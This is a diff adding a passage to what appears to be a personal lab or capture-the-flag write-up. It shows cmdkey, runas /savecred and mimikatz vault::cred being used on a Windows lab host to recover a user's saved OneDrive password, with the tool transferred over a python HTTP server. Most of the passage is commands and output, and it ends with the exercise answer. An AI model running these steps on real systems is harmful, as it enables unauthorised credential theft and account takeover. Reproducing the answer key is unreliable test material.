@@ -1262,5 +1262,63 @@ mimikatz.exe
 ### What is the password mcharles uses for OneDrive?
 
 ```powershell
+ cmdkey /list
+ ---
+ Currently stored credentials:
 
+    Target: Domain:interactive=SRV01\mcharles
+    Type: Domain Password
+    User: SRV01\mcharles
 ```
+
+```powershell
+runas /savecred /user:SRV01\mcharles cmd
+# Get a shell as mcharles
+```
+
+The problem was tranfering the mimikatz file but I could solve by creating a python server and downloading the file from the Windows Victim
+
+```shell
+# Linux
+python -m http.server 8090
+```
+
+```powershell
+# Windows after downloading the file via http
+C:/Temp/mimikatz.exe
+
+# We don't hace privilege, So tried with non-privilege commands over our  session and get
+vault::cred
+---
+mimikatz # vault::cred
+TargetName : onedrive.live.com / <NULL>
+UserName   : mcharles@inlanefreight.local
+Comment    : <NULL>
+Type       : 1 - generic
+Persist    : 3 - enterprise
+Flags      : 00000000
+Credential : Inlanefreight#2025
+Attributes : 0
+
+TargetName : WindowsLive:target=virtualapp/didlogical / <NULL>
+UserName   : 02jejfxhvabjneqt
+Comment    : PersistedCredential
+Type       : 1 - generic
+Persist    : 2 - local_machine
+Flags      : 00000000
+Credential :
+Attributes : 32
+
+TargetName : LegacyGeneric:target=onedrive.live.com / <NULL>
+UserName   : mcharles@inlanefreight.local
+Comment    : <NULL>
+Type       : 1 - generic
+Persist    : 3 - enterprise
+Flags      : 00000000
+Credential : Inlanefreight#2025
+Attributes : 0
+```
+
+>[!Answer]
+>Inlanefreight#2025
+
